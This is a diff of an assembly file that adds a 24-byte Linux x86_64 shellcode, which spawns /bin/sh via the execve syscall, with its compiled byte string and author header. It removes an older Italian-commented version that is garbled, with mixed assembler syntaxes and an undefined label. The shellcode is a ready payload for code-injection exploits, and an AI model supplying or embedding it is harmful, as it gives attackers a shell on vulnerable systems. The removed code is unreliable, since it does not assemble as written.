@@ -1,30 +1,23 @@
+;Category: Shellcode
+;Title: GNU/Linux x86_64 - execve /bin/sh
+;Author: m4n3dw0lf
+;Github: https://github.com/m4n3dw0lf
+;Date: 14/06/2017
+;Architecture: Linux x86_64
+;Tested on : #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux
+section .text
+  global _start
+    _start:
+      push rax
+      xor rdx, rdx
+      xor rsi, rsi
+      mov rbx,'/bin//sh'
+      push rbx
+      push rsp
+      pop rdi
+      mov al, 59
+      syscall
 
-
-; ARG0 (rdi)	ARG1 (rsi)	
-; ARG2 (rdx)	ARG3 (r10)	
-; ARG4 (r8)	ARG5 (r9)
-.text
-
-global _main
-
-_main:
-    jmp _find               ; alta alla procedura find
-
-_cont:
-    pop rdi             ; carica nel registro rdi il primo parametro
-                        ; della system-call   
-    xor eax, eax
-    mov al, 0x7(rdi)    ; copia dei byte zero alla fine della riga sh --> RIP
-    lea (rdi), esi      ; carica l'indirizzo () nel registro esi
-                                                                     
-_find:
-    call cont
-                          
-sh: 
-    .string '/bin/sh'   ; comanda da eseguire
-args:
-    .long 0             ; separato degli argomenti della execv
-    .long 0             ; args[1]= NULL
-    
+;(24 bytes) compiled \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
 
 
